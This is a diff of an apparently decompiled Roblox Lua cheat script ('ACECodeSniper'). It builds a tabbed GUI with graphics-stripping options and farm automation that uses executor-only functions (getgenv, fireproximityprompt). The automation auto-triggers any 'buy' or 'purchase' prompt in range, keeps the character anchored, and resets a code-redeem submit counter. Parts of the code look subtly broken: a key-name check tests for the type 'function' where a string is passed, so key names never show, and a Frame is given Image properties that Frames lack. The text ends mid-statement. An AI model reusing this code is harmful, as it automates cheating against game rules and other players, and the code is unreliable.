+          instance5.BackgroundColor3 = tbl25.Log
+          instance5.BackgroundTransparency = 0.1
+          instance5.BorderSizePixel = 0
+          instance5.ZIndex = 6
+          instance5.Parent = frame6
+          fn46(instance5, 7)
+          createUIStroke2(instance5, tbl25.White, 1, 0.55)
+
+          local function fn52(name, text, arg)
+            local textButton = Instance.new("TextButton")
+            textButton.Name = name
+            textButton.Size = UDim2.new(0.33333333333333331, 0, 1, 0)
+            textButton.Position = UDim2.new(arg, 0, 0, 0)
+            textButton.BackgroundColor3 = Color3.fromRGB(30, 26, 30)
+            textButton.BackgroundTransparency = 1
+            textButton.BorderSizePixel = 0
+            textButton.AutoButtonColor = false
+            textButton.Text = text
+            textButton.TextSize = 10
+            textButton.TextColor3 = tbl25.Text
+            textButton.Font = Enum.Font.GothamBold
+            textButton.ZIndex = 7
+            textButton.Parent = instance5
+            fn46(textButton, 6)
+            fn47(textButton)
+            return textButton, (createUIStroke2(textButton, tbl25.White, 1, 1))
+          end
+
+          local MainTab, v90 = fn52("MainTab", "MAIN", 0)
+          local FarmTab, v91 = fn52("FarmTab", "FARM", 0.33333333333333331)
+          local SettingsTab, v92 = fn52("SettingsTab", "SETTINGS", 0.66666666666666663)
+
+          local function fn53(arg, arg2, arg3)
+            arg.TextColor3 = arg3 and tbl25.White or tbl25.Text
+            arg.BackgroundTransparency = arg3 and 0.05 or 1
+            arg2.Transparency = arg3 and 0.55 or 1
+          end
+
+          local tbl30 = {
+            { Key = "MAIN", Page = instance4, Button = MainTab, Outline = v90 },
+            { Key = "FARM", Page = instance3, Button = FarmTab, Outline = v91 },
+            { Key = "SETTINGS", Page = frame5, Button = SettingsTab, Outline = v92 },
+          }
+
+          local v93 = nil
+
+          local function fn54(arg)
+            local page = nil
+
+            for _, v94 in ipairs(tbl30) do
+              local flag18 = v94.Key == arg
+              fn53(v94.Button, v94.Outline, flag18)
+
+              if flag18 then
+                page = v94.Page
+              else
+                v94.Page.Visible = false
+              end
+            end
+
+            if not page then
+              return
+            end
+            page.Visible = true
+
+            if v93 ~= nil and v93 ~= arg then
+              page.Position = UDim2.fromOffset(0, 108)
+              v77
+                :Create(page, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = UDim2.fromOffset(0, 98) })
+                :Play()
+            else
+              page.Position = UDim2.fromOffset(0, 98)
+            end
+
+            v93 = arg
+            tbl28.setActiveTab(arg)
+          end
+
+          MainTab.MouseButton1Click:Connect(function()
+            fn54("MAIN")
+          end)
+
+          FarmTab.MouseButton1Click:Connect(function()
+            fn54("FARM")
+          end)
+
+          SettingsTab.MouseButton1Click:Connect(function()
+            fn54("SETTINGS")
+          end)
+
+          fn54("MAIN")
+        end
+
+        local frame6 = Instance.new("Frame")
+        frame6.Name = "AppearanceDash"
+        frame6.Size = UDim2.fromOffset(10, 1)
+        frame6.Position = UDim2.fromOffset(16, 19)
+        frame6.BackgroundColor3 = tbl25.Dim
+        frame6.BorderSizePixel = 0
+        frame6.ZIndex = 3
+        frame6.Parent = frame5
+
+        do
+          local v90 = 11
+          local white = tbl25.White
+          local gothamBold = Enum.Font.GothamBold
+          local appearanceTitle = createTextLabel(
+            frame5,
+            "AppearanceTitle",
+            "APPEARANCE",
+            UDim2.fromOffset(84, 32),
+            UDim2.fromOffset(33, 8),
+            v90,
+            white,
+            gothamBold
+          )
+          appearanceTitle.TextStrokeColor3 = Color3.new(0, 0, 0)
+          appearanceTitle.TextStrokeTransparency = 0.35
+          appearanceTitle.ZIndex = 3
+        end
+
+        local frame7 = Instance.new("Frame")
+        frame7.Name = "AppearanceLine"
+        frame7.Size = UDim2.new(1, -140, 0, 1)
+        frame7.Position = UDim2.fromOffset(123, 19)
+        frame7.BackgroundColor3 = tbl25.Dim
+        frame7.BackgroundTransparency = 0.35
+        frame7.BorderSizePixel = 0
+        frame7.ZIndex = 3
+        frame7.Parent = frame5
+        local fn52
+
+        do
+          local scrollingFrame = Instance.new("ScrollingFrame")
+          scrollingFrame.Name = "BackgroundOptions"
+          scrollingFrame.Size = UDim2.new(1, -34, 0, 82)
+          scrollingFrame.Position = UDim2.fromOffset(17, 38)
+          scrollingFrame.BackgroundColor3 = tbl25.Log
+          scrollingFrame.BackgroundTransparency = 0.3
+          scrollingFrame.BorderSizePixel = 0
+          scrollingFrame.ScrollBarThickness = 3
+          scrollingFrame.ScrollBarImageColor3 = tbl25.Dim
+          scrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.X
+          scrollingFrame.CanvasSize = UDim2.new()
+          scrollingFrame.ScrollingDirection = Enum.ScrollingDirection.X
+          scrollingFrame.ZIndex = 3
+          scrollingFrame.Parent = frame5
+          fn46(scrollingFrame, 9)
+          createUIStroke2(scrollingFrame, tbl25.White, 1, 0.8)
+          local uiListLayout = Instance.new("UIListLayout")
+          uiListLayout.FillDirection = Enum.FillDirection.Horizontal
+          uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+          uiListLayout.Padding = UDim.new(0, 6)
+          uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+          uiListLayout.Parent = scrollingFrame
+          local uiPadding2 = Instance.new("UIPadding")
+          uiPadding2.PaddingLeft = UDim.new(0, 7)
+          uiPadding2.PaddingRight = UDim.new(0, 7)
+          uiPadding2.Parent = scrollingFrame
+          local tbl30 = {}
+
+          fn52 = function(arg)
+            local clamp = math.clamp
+            local floor2 = math.floor
+            local n41 = tonumber(arg) or 2
+            local v90 = 1
+            local n42 = #tbl26
+            local v91 = clamp(floor2(n41), v90, n42)
+            tbl18.backgroundIndex = v91
+            local v92 = tbl26[v91]
+            imageLabel.Image = v92.Image
+            imageLabel.Visible = not v92.IsNone
+
+            for i, v93 in ipairs(tbl30) do
+              local uiStroke = v93:FindFirstChildOfClass("UIStroke")
+
+              if uiStroke then
+                uiStroke.Color = i == v91 and tbl25.White or tbl25.Dim
+                uiStroke.Transparency = i == v91 and 0.1 or 0.76
+                uiStroke.Thickness = i == v91 and 2 or 1
+              end
+            end
+
+            fn31()
+          end
+
+          for i, v90 in ipairs(tbl26) do
+            local instance4 = Instance.new("TextButton")
+            instance4.Name = "Background" .. tostring(i)
+            instance4.Size = UDim2.fromOffset(66, 40)
+            instance4.BackgroundColor3 = tbl25.Control
+            instance4.BackgroundTransparency = v90.IsNone and 0.35 or 0
+            instance4.BorderSizePixel = 0
+            instance4.AutoButtonColor = false
+            instance4.Text = ""
+            instance4.LayoutOrder = i
+            instance4.ZIndex = 4
+            instance4.Parent = scrollingFrame
+            fn46(instance4, 8)
+            createUIStroke2(instance4, tbl25.Dim, 1, 0.76)
+
+            if v90.IsNone then
+              local white = tbl25.White
+              local gothamBold = Enum.Font.GothamBold
+              createTextLabel(instance4, "NoBg", "NO BG", UDim2.new(1, -16, 0, 14), UDim2.fromOffset(8, 17), 8, white, gothamBold).ZIndex =
+                5
+              local dim = tbl25.Dim
+              local gothamBold2 = Enum.Font.GothamBold
+              local v91 = 10
+              createTextLabel(instance4, "None", "NONE", UDim2.new(1, -12, 0, 14), UDim2.fromOffset(8, 34), 8, dim, gothamBold2).ZIndex =
+                v91
+            else
+              local instance5 = Instance.new("Frame")
+              instance5.Name = "Preview"
+              instance5.Size = UDim2.new(1, -4, 1, -6)
+              instance5.Position = UDim2.fromOffset(2, 2)
+              instance5.BackgroundColor3 = tbl25.Window
+              instance5.BorderSizePixel = 0
+              instance5.Image = v90.Image
+              instance5.ScaleType = Enum.ScaleType.Crop
+              instance5.ZIndex = 5
+              instance5.Parent = instance4
+              fn46(instance5, 6)
+              local white = tbl25.White
+              local gothamBold = Enum.Font.GothamBold
+              local number =
+                createTextLabel(instance4, "Number", v90.Name, UDim2.fromOffset(28, 16), UDim2.new(1, -25, 1, -17), 8, white, gothamBold)
+              number.TextXAlignment = Enum.TextXAlignment.Right
+              number.TextStrokeColor3 = Color3.new(0, 0, 0)
+              number.TextStrokeTransparency = 0.25
+              number.ZIndex = 6
+            end
+
+            fn47(instance4)
+            table.insert(tbl30, instance4)
+
+            instance4.MouseButton1Click:Connect(function()
+              fn52(i)
+            end)
+          end
+        end
+
+        do
+          local instance4 = Instance.new("Frame")
+          instance4.Name = "GuiScale"
+          instance4.Size = UDim2.new(1, -34, 0, 42)
+          instance4.Position = UDim2.fromOffset(17, 140)
+          instance4.BackgroundColor3 = tbl25.Log
+          instance4.BackgroundTransparency = 0.12
+          instance4.BorderSizePixel = 0
+          instance4.ZIndex = 3
+          instance4.Parent = frame5
+          fn46(instance4, 9)
+          createUIStroke2(instance4, tbl25.White, 1, 0.8)
+          local white = tbl25.White
+          local gothamBold = Enum.Font.GothamBold
+          local scaleTitle =
+            createTextLabel(instance4, "ScaleTitle", "GUI Scale", UDim2.fromOffset(120, 60), UDim2.fromOffset(12, 0), 11, white, gothamBold)
+          scaleTitle.TextStrokeColor3 = Color3.new(0, 0, 0)
+          scaleTitle.TextStrokeTransparency = 0.35
+          scaleTitle.ZIndex = 4
+
+          local function fn53(name, text, arg, arg2)
+            local instance5 = Instance.new("TextButton")
+            instance5.Name = name
+            instance5.Size = UDim2.fromOffset(arg2, 24)
+            instance5.Position = UDim2.new(1, arg, 0.5, -16)
+            instance5.BackgroundColor3 = tbl25.White
+            instance5.BorderSizePixel = 0
+            instance5.AutoButtonColor = false
+            instance5.Text = text
+            instance5.TextSize = 12
+            instance5.TextColor3 = tbl25.Window
+            instance5.Font = Enum.Font.GothamBold
+            instance5.ZIndex = 4
+            instance5.Parent = instance4
+            fn46(instance5, 12)
+            return instance5
+          end
+
+          local ScaleMinus = fn53("ScaleMinus", "-", -124, 30)
+          local ScaleValue = fn53("ScaleValue", "", -92, 48)
+          ScaleValue.Active = false
+          local ScalePlus = fn53("ScalePlus", "+", -38, 30)
+          fn47(ScaleMinus)
+          fn47(ScalePlus)
+
+          local function fn54(arg)
+            tbl18.guiScale = math.clamp(math.floor((tonumber(arg) or 0.92) * 20 + 0.5) / 20, 0.5, 1.5)
+            ScaleValue.Text = string.format("%.2f", tbl18.guiScale)
+            fn48()
+            fn31()
+          end
+
+          ScaleMinus.MouseButton1Click:Connect(function()
+            fn54(tbl18.guiScale - 0.05)
+          end)
+
+          ScalePlus.MouseButton1Click:Connect(function()
+            fn54(tbl18.guiScale + 0.05)
+          end)
+
+          local frame8 = Instance.new("Frame")
+          frame8.Name = "OptimizationDash"
+          frame8.Size = UDim2.fromOffset(8, 1)
+          frame8.Position = UDim2.fromOffset(17, 197)
+          frame8.BackgroundColor3 = tbl25.Dim
+          frame8.BorderSizePixel = 0
+          frame8.ZIndex = 3
+          frame8.Parent = frame5
+          local white2 = tbl25.White
+          local gothamBold2 = Enum.Font.GothamBold
+          local optimizationTitle = createTextLabel(
+            frame5,
+            "OptimizationTitle",
+            "OPTIMIZATION",
+            UDim2.fromOffset(96, 24),
+            UDim2.fromOffset(33, 186),
+            11,
+            white2,
+            gothamBold2
+          )
+          optimizationTitle.TextStrokeColor3 = Color3.new(0, 0, 0)
+          optimizationTitle.TextStrokeTransparency = 0.35
+          optimizationTitle.ZIndex = 3
+          local frame9 = Instance.new("Frame")
+          frame9.Name = "OptimizationLine"
+          frame9.Size = UDim2.new(1, -152, 0, 1)
+          frame9.Position = UDim2.fromOffset(135, 197)
+          frame9.BackgroundColor3 = tbl25.Dim
+          frame9.BackgroundTransparency = 0.35
+          frame9.BorderSizePixel = 0
+          frame9.ZIndex = 3
+          frame9.Parent = frame5
+          local scrollingFrame = Instance.new("ScrollingFrame")
+          scrollingFrame.Name = "OptimizationOptions"
+          scrollingFrame.Size = UDim2.new(1, -34, 0, 86)
+          scrollingFrame.Position = UDim2.fromOffset(16, 204)
+          scrollingFrame.BackgroundTransparency = 1
+          scrollingFrame.BorderSizePixel = 0
+          scrollingFrame.ScrollBarThickness = 3
+          scrollingFrame.ScrollBarImageColor3 = tbl25.Dim
+          scrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
+          scrollingFrame.CanvasSize = UDim2.new()
+          scrollingFrame.ScrollingDirection = Enum.ScrollingDirection.Y
+          scrollingFrame.ZIndex = 3
+          scrollingFrame.Parent = frame5
+          local instance5 = Instance.new("UIListLayout")
+          instance5.FillDirection = Enum.FillDirection.Vertical
+          instance5.HorizontalAlignment = Enum.HorizontalAlignment.Center
+          instance5.Padding = UDim.new(0, 5)
+          instance5.SortOrder = Enum.SortOrder.LayoutOrder
+          instance5.Parent = scrollingFrame
+          local uiPadding2 = Instance.new("UIPadding")
+          uiPadding2.PaddingTop = UDim.new(0, 5)
+          uiPadding2.PaddingBottom = UDim.new(0, 10)
+          uiPadding2.Parent = scrollingFrame
+          local tbl30 = {}
+          local v90 = 0
+          local connection3 = nil
+          local flag18 = false
+          local tbl31 = nil
+
+          local function fn55(arg)
+            pcall(function()
+              if arg:IsA("BasePart") then
+                arg.Material = Enum.Material.Plastic
+                arg.Reflectance = 0
+                arg.CastShadow = false
+              elseif arg:IsA("Decal") or arg:IsA("Texture") then
+                arg.Transparency = 1
+              elseif
+                arg:IsA("ParticleEmitter")
+                or arg:IsA("Trail")
+                or arg:IsA("Beam")
+                or arg:IsA("Fire")
+                or arg:IsA("Smoke")
+                or arg:IsA("Sparkles")
+              then
+                arg.Enabled = false
+              elseif arg:IsA("AnimationController") or arg:IsA("Animator") then
+                for _, v91 in ipairs(arg:GetPlayingAnimationTracks()) do
+                  pcall(function()
+                    v91:Stop(0)
+                  end)
+                end
+              end
+            end)
+          end
+
+          local function fn56()
+            flag18 = true
+
+            if not tbl31 then
+              tbl31 = {
+                brightness = v79.Brightness,
+                fogEnd = v79.FogEnd,
+                diffuse = v79.EnvironmentDiffuseScale,
+                specular = v79.EnvironmentSpecularScale,
+                shadows = v79.GlobalShadows,
+              }
+            end
+
+            pcall(function()
+              v79.GlobalShadows = false
+              v79.FogEnd = 1e10
+              v79.EnvironmentDiffuseScale = 0
+              v79.EnvironmentSpecularScale = 0
+            end)
+
+            for _, child in ipairs(v79:GetChildren()) do
+              pcall(function()
+                if
+                  child:IsA("BlurEffect")
+                  or child:IsA("SunRaysEffect")
+                  or child:IsA("ColorCorrectionEffect")
+                  or child:IsA("BloomEffect")
+                  or child:IsA("DepthOfFieldEffect")
+                then
+                  child.Enabled = false
+                end
+              end)
+            end
+
+            for _, descendant in ipairs(workspace:GetDescendants()) do
+              fn55(descendant)
+            end
+
+            if connection3 then
+              connection3:Disconnect()
+            end
+
+            connection3 = workspace.DescendantAdded:Connect(function(descendant)
+              if flag18 then
+                fn55(descendant)
+              end
+            end)
+          end
+
+          local function fn57()
+            flag18 = false
+
+            if connection3 then
+              connection3:Disconnect()
+              connection3 = nil
+            end
+
+            pcall(function()
+              if tbl31 then
+                v79.GlobalShadows = tbl31.shadows
+                v79.Brightness = tbl31.brightness
+                v79.FogEnd = tbl31.fogEnd
+                v79.EnvironmentDiffuseScale = tbl31.diffuse
+                v79.EnvironmentSpecularScale = tbl31.specular
+              else
+                v79.GlobalShadows = true
+              end
+
+              for _, child in ipairs(v79:GetChildren()) do
+                pcall(function()
+                  if
+                    child:IsA("BlurEffect")
+                    or child:IsA("SunRaysEffect")
+                    or child:IsA("ColorCorrectionEffect")
+                    or child:IsA("BloomEffect")
+                    or child:IsA("DepthOfFieldEffect")
+                  then
+                    child.Enabled = true
+                  end
+                end)
+              end
+            end)
+          end
+
+          local flag19 = false
+          local connection4 = nil
+
+          local function fn58()
+            local character = localPlayer2.Character
+            if not character then
+              return
+            end
+
+            for _, descendant in ipairs(character:GetDescendants()) do
+              if descendant:IsA("Accessory") or descendant:IsA("Hat") then
+                pcall(function()
+                  descendant:Destroy()
+                end)
+              end
+            end
+          end
+
+          local function fn59()
+            if flag19 then
+              return
+            end
+            flag19 = true
+            fn58()
+
+            connection4 = localPlayer2.CharacterAdded:Connect(function()
+              task.wait(0.5)
+
+              if flag19 then
+                fn58()
+              end
+            end)
+          end
+
+          local function fn60()
+            flag19 = false
+
+            if connection4 then
+              connection4:Disconnect()
+              connection4 = nil
+            end
+          end
+
+          local function fn61()
+            for _, descendant in ipairs(workspace:GetDescendants()) do
+              if
+                descendant:IsA("ParticleEmitter")
+                or descendant:IsA("Trail")
+                or descendant:IsA("Beam")
+                or descendant:IsA("Fire")
+                or descendant:IsA("Smoke")
+                or descendant:IsA("Sparkles")
+                or descendant:IsA("Explosion")
+                or descendant:IsA("PointLight")
+                or descendant:IsA("SpotLight")
+                or descendant:IsA("SurfaceLight")
+              then
+                pcall(function()
+                  descendant:Destroy()
+                end)
+              end
+            end
+          end
+
+          local function fn62(arg, visible)
+            if arg == "fallingParticles" then
+              local v91 = frame2:FindFirstChild("ACEFallingDots")
+
+              if v91 then
+                v91.Visible = visible
+              end
+
+              return
+            end
+
+            if arg ~= "master" then
+              return
+            end
+
+            if visible then
+              fn56()
+              fn59()
+              fn61()
+            else
+              fn57()
+              fn60()
+            end
+          end
+
+          if getgenv then
+            getgenv().ACECodeSniperStopOptimization = function()
+              fn57()
+              fn60()
+            end
+          end
+
+          local function fn63(arg, arg2, arg3)
+            local flag20 = tbl18.optimization[arg]
+
+            if type(flag20) ~= "boolean" then
+              flag20 = arg3 and true or false
+            end
+
+            tbl30[arg] = flag20
+            v90 += 1
+            local instance6 = Instance.new("Frame")
+            instance6.Name = "Row_" .. arg
+            instance6.Size = UDim2.new(1, -14, 0, 30)
+            instance6.LayoutOrder = v90
+            instance6.BackgroundColor3 = tbl25.Log
+            instance6.BackgroundTransparency = 0.12
+            instance6.BorderSizePixel = 0
+            instance6.ZIndex = 6
+            instance6.Parent = scrollingFrame
+            fn46(instance6, 6)
+            createUIStroke2(instance6, tbl25.White, 1, 0.84)
+            local white3 = tbl25.White
+            local gothamMedium = Enum.Font.GothamMedium
+            createTextLabel(instance6, "Title", arg2, UDim2.new(1, -58, 1, 0), UDim2.fromOffset(11, 0), 10, white3, gothamMedium).ZIndex = 5
+
+            local v91 = tbl28.makeSwitch(instance6, flag20, function(arg4)
+              tbl30[arg] = arg4
+              tbl18.optimization[arg] = arg4
+              fn31()
+              fn62(arg, arg4)
+            end, { zIndex = 5 })
+
+            fn62(arg, flag20)
+            return v91
+          end
+
+          fn63("fallingParticles", "Falling snow", true)
+          fn63("master", "Optimization", false)
+
+          local function fn64()
+            local tbl32 = {
+              XBOX = {
+                ButtonA = "A",
+                ButtonB = "B",
+                ButtonX = "X",
+                ButtonY = "Y",
+                ButtonL1 = "LB",
+                ButtonR1 = "RB",
+                ButtonL2 = "LT",
+                ButtonR2 = "RT",
+                ButtonL3 = "LS",
+                ButtonR3 = "RS",
+                ButtonSelect = "VIEW",
+                ButtonStart = "MENU",
+                DPadUp = "D-UP",
+                DPadDown = "D-DN",
+                DPadLeft = "D-LT",
+                DPadRight = "D-RT",
+              },
+              PS = {
+                ButtonA = "CROSS",
+                ButtonB = "CIRCLE",
+                ButtonX = "SQUARE",
+                ButtonY = "TRIANGL",
+                ButtonL1 = "L1",
+                ButtonR1 = "R1",
+                ButtonL2 = "L2",
+                ButtonR2 = "R2",
+                ButtonL3 = "L3",
+                ButtonR3 = "R3",
+                ButtonSelect = "CREATE",
+                ButtonStart = "OPTIONS",
+                DPadUp = "D-UP",
+                DPadDown = "D-DN",
+                DPadLeft = "D-LT",
+                DPadRight = "D-RT",
+              },
+            }
+
+            local str9 = "XBOX"
+            local platform = nil
+
+            pcall(function()
+              platform = v78:GetPlatform()
+            end)
+
+            for _, v91 in ipairs({ "PS3", "PS4", "PS5" }) do
+              local v92 = nil
+
+              pcall(function()
+                v92 = Enum.Platform[v91]
+              end)
+
+              if v92 and platform == v92 then
+                str9 = "PS"
+                break
+              else
+              end
+            end
+
+            local function fn65(arg)
+              local v91 = "function"
+              if type(arg) ~= v91 or arg == "" or arg == "Unknown" then
+                return "NONE"
+              end
+              local v92 = tbl32[str9][arg]
+              if v92 then
+                return v92
+              end
+              local v93 = nil
+
+              pcall(function()
+                v93 = Enum.KeyCode[arg]
+              end)
+
+              if v93 then
+                local stringForKeyCode = nil
+
+                pcall(function()
+                  stringForKeyCode = v78:GetStringForKeyCode(v93)
+                end)
+
+                if type(stringForKeyCode) == "string" and stringForKeyCode ~= "" and #stringForKeyCode <= 7 then
+                  return string.upper(stringForKeyCode)
+                end
+              end
+
+              return string.upper(arg)
+            end
+
+            local frame10 = Instance.new("Frame")
+            frame10.Name = "FarmDash"
+            frame10.Size = UDim2.fromOffset(10, 1)
+            frame10.Position = UDim2.fromOffset(17, 19)
+            frame10.BackgroundColor3 = tbl25.Dim
+            frame10.BorderSizePixel = 0
+            frame10.ZIndex = 3
+            frame10.Parent = instance3
+            local v91 = 11
+            local white3 = tbl25.White
+            local gothamBold3 = Enum.Font.GothamBold
+            local farmTitle =
+              createTextLabel(instance3, "FarmTitle", "FARM", UDim2.fromOffset(44, 24), UDim2.fromOffset(33, 8), v91, white3, gothamBold3)
+            farmTitle.TextStrokeColor3 = Color3.new(0, 0, 0)
+            farmTitle.TextStrokeTransparency = 0.35
+            farmTitle.ZIndex = 3
+            local frame11 = Instance.new("Frame")
+            frame11.Name = "FarmLine"
+            frame11.Size = UDim2.new(1, -100, 0, 1)
+            frame11.Position = UDim2.fromOffset(83, 19)
+            frame11.BackgroundColor3 = tbl25.Dim
+            frame11.BackgroundTransparency = 0.35
+            frame11.BorderSizePixel = 0
+            frame11.ZIndex = 3
+            frame11.Parent = instance3
+            local flag20 = false
+            local connection5 = nil
+            local connection6 = nil
+
+            local function fn66(anchored)
+              local character = localPlayer2.Character
+              if not character then
+                return
+              end
+              local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+              if not humanoidRootPart then
+                return
+              end
+
+              pcall(function()
+                humanoidRootPart.Anchored = anchored
+              end)
+            end
+
+            local function fn67(arg)
+              flag20 = arg and true or false
+
+              if flag20 then
+                fn66(true)
+
+                if not connection5 then
+                  connection5 = localPlayer2.CharacterAdded:Connect(function(character)
+                    character:WaitForChild("HumanoidRootPart", 10)
+                    task.wait(0.35)
+
+                    if flag20 then
+                      fn66(true)
+                    end
+                  end)
+                end
+
+                if not connection6 then
+                  local n41 = 0
+
+                  connection6 = v76.Heartbeat:Connect(function(deltaTime)
+                    n41 += deltaTime
+                    if n41 < 0.25 then
+                      return
+                    end
+                    n41 = 0
+
+                    if flag20 then
+                      fn66(true)
+                    end
+                  end)
+                end
+              else
+                if connection5 then
+                  connection5:Disconnect()
+                  connection5 = nil
+                end
+
+                if connection6 then
+                  connection6:Disconnect()
+                  connection6 = nil
+                end
+
+                fn66(false)
+              end
+            end
+
+            local flag21 = false
+            local tbl33 = {}
+            local n41 = 0
+            local tbl34 = {}
+
+            local function fn68(arg)
+              local ok, result = pcall(function()
+                local parent = arg.Parent
+                return string.lower(
+                  tostring(arg.ActionText)
+                    .. " "
+                    .. tostring(arg.ObjectText)
+                    .. " "
+                    .. tostring(arg.Name)
+                    .. " "
+                    .. tostring(parent and parent.Name or "")
+                )
+              end)
+
+              if not ok or type(result) ~= "string" then
+                return false
+              end
+              return string.find(result, "buy", 1, true) ~= nil or string.find(result, "purchase", 1, true) ~= nil
+            end
+
+            local function fn69(arg)
+              if typeof(arg) ~= "Instance" then
+                return
+              end
+
+              if not arg:IsA("ProximityPrompt") then
+                return
+              end
+
+              if fn68(arg) then
+                tbl34[arg] = true
+              end
+            end
+
+            local function fn70()
+              for _, descendant in ipairs(workspace:GetDescendants()) do
+                fn69(descendant)
+              end
+            end
+
+            local function fn71(arg)
+              local parent = arg.Parent
+              if not parent then
+                return nil
+              end
+
+              local ok, result = pcall(function()
+                if parent:IsA("BasePart") then
+                  return parent.Position
+                end
+
+                if parent:IsA("Attachment") then
+                  return parent.WorldPosition
+                end
+
+                if parent:IsA("Model") then
+                  return parent:GetPivot().Position
+                end
+                local basePart = parent:FindFirstChildWhichIsA("BasePart", true)
+                if basePart then
+                  return basePart.Position
+                end
+                return nil
+              end)
+
+              if ok then
+                return result
+              end
+              return nil
+            end
+
+            local function fn72(arg)
+              pcall(function()
+                if arg.HoldDuration > 0 then
+                  arg.HoldDuration = 0
+                end
+              end)
+
+              if pcall(fireproximityprompt, arg) then
+                return
+              end
+              pcall(fireproximityprompt, arg, 1)
+            end
+
+            local function fn73(arg)
+              for k in pairs(tbl34) do
+                if not k:IsDescendantOf(workspace) then
+                  tbl34[k] = nil
+                elseif k.Enabled then
+                  local v92 = fn71(k)
+
+                  if v92 then
+                    local maxActivationDistance = k.MaxActivationDistance
+
+                    if maxActivationDistance <= 0 then
+                      maxActivationDistance = 10
+                    end
+
+                    if (v92 - arg.Position).Magnitude <= maxActivationDistance + 4 then
+                      fn72(k)
+                    end
+                  end
+                end
+              end
+            end
+
+            local function fn74(arg)
+              flag21 = arg and true or false
+              n41 += 1
+
+              for _, v92 in ipairs(tbl33) do
+                pcall(function()
+                  v92:Disconnect()
+                end)
+              end
+
+              table.clear(tbl33)
+              if not flag21 then
+                return
+              end
+              local v92 = "function"
+
+              if type(fireproximityprompt) ~= v92 then
+                flag21 = false
+                fn32("Auto buy needs executor fireproximityprompt", tbl25.Red)
+                return false
+              end
+
+              pcall(fn70)
+
+              table.insert(
+                tbl33,
+                workspace.DescendantAdded:Connect(function(descendant)
+                  if typeof(descendant) == "Instance" and descendant:IsA("ProximityPrompt") then
+                    task.defer(fn69, descendant)
+                  end
+                end)
+              )
+
+              local v93 = n41
+
+              task.spawn(function()
+                local n42 = 0
+
+                while flag21 and v93 == n41 do
+                  pcall(function()
+                    local character = localPlayer2.Character
+                    character = character and character:FindFirstChild("HumanoidRootPart")
+
+                    if character then
+                      fn73(character)
+                    end
+                  end)
+
+                  n42 += 0.2
+
+                  if n42 >= 2 then
+                    n42 = 0
+                    pcall(fn70)
+                  end
+
+                  task.wait(0.2)
+                end
+              end)
+            end
+
+            local function fn75()
+              n35 += 1
+              n34 = os.clock() + 0.6
+              local n42 = 0
+
+              for _, descendant in ipairs(playerGui:GetDescendants()) do
+                if descendant:IsA("TextBox") and descendant.Parent and descendant.Parent.Name == "CodeRedeem" then
+                  if descendant.Text ~= "" then
+                    descendant.Text = ""
+                    n42 += 1
+                  end
+
+                  pcall(function()
+                    descendant:ReleaseFocus(false)
+                  end)
+                end
+              end
+
+              str7 = ""
+
+              if fn35 then
+                fn35()
+              end
+
+              if fn34 then
+                fn34()
+              end
+
+              return n42
+            end
+
+            local function fn76()
+              local ok, result = pcall(fn75)
+
+              if not ok then
+                local red = tbl25.Red
+                fn32("Clear box failed: " .. tostring(result), red)
+                return nil
+              end
+
+              if result > 0 then
+                fn32("Cleared " .. result .. " code box" .. (result == 1 and "" or "es") .. " - submit counter reset", tbl25.Green)
+              else
+                fn32("Code box already empty - submit counter reset", tbl25.Dim)
+              end
+
+              return result
+            end
+
+            local tbl35 = {}
+            local flag22 = nil
+
+            local function fn77()
+              for _, v92 in ipairs(tbl35) do
+                v92.RefreshKey()
+              end
+            end
+
+            local function fn78(arg, arg2, arg3, arg4)
+              local instance6 = Instance.new("Frame")
+              instance6.Name = arg .. "Row"
+              instance6.Size = UDim2.new(1, -34, 0, 42)
+              instance6.Position = UDim2.fromOffset(17, arg3)
+              instance6.BackgroundColor3 = tbl25.Log
+              instance6.BackgroundTransparency = 0.12
+              instance6.BorderSizePixel = 0
+              instance6.ZIndex = 3
+              instance6.Parent = instance3
+              fn46(instance6, 9)
+              createUIStroke2(instance6, tbl25.White, 1, 0.8)
+              local textButton = Instance.new("TextButton")
+              textButton.Name = "Keybind"
+              textButton.Size = UDim2.fromOffset(72, 24)
+              textButton.Position = UDim2.fromOffset(9, 9)
+              textButton.BackgroundColor3 = tbl25.Control
+              textButton.BorderSizePixel = 0
+              textButton.AutoButtonColor = false
+              textButton.Text = ""
+              textButton.TextSize = 10
+              textButton.TextColor3 = tbl25.White
+              textButton.Font = Enum.Font.GothamBold
+              textButton.ZIndex = 5
+              textButton.Parent = instance6
+              fn46(textButton, 7)
+              createUIStroke2(textButton, tbl25.White, 1, 0.72)
+              fn47(textButton)
+              local white4 = tbl25.White
+              local gothamMedium = Enum.Font.GothamMedium
+              local v92 = 10
+              createTextLabel(instance6, "Title", arg2, UDim2.new(1, -153, 1, 0), UDim2.fromOffset(88, 0), 11, white4, gothamMedium).ZIndex =
+                v92
+              local textButton2 = Instance.new("TextButton")
+              textButton2.Name = "Switch"
+              textButton2.Size = UDim2.fromOffset(47, 24)
+              textButton2.Position = UDim2.new(1, -56, 0.5, -12)
+              textButton2.BackgroundColor3 = tbl25.Control
+              textButton2.BorderSizePixel = 0
+              textButton2.AutoButtonColor = false
+              textButton2.Text = ""
+              textButton2.ZIndex = 5
+              textButton2.Parent = instance6
+              fn46(textButton2, 12)
+              local v93 = createUIStroke2(textButton2, tbl25.White, 1, 0.88)
+              local frame12 = Instance.new("Frame")
+              frame12.Name = "Knob"
+              frame12.Size = UDim2.fromOffset(20, 28)
+              frame12.Position = UDim2.new(0, 2, 0.5, -8)
+              frame12.BackgroundColor3 = tbl25.White
+              frame12.BorderSizePixel = 0
+              frame12.ZIndex = 6
+              frame12.Parent = textButton2
+              fn46(frame12, 10)
+              local tbl36
+
+              tbl36 = {
+                Id = arg,
+                KeyName = "",
+                Active = false,
+                RefreshKey = function()
+                  local flag23 = flag22 == tbl36
+                  textButton.Text = flag23 and "..." or fn65(tbl36.KeyName)
+                  textButton.TextColor3 = flag23 and tbl25.Green or tbl25.White
+                end,
+                SetState = function(arg5, arg6)
+                  tbl36.Active = arg5 and true or false
+                  local tweenInfo = TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+                  v77:Create(textButton2, tweenInfo, { BackgroundColor3 = tbl36.Active and tbl25.Accent or tbl25.Control }):Play()
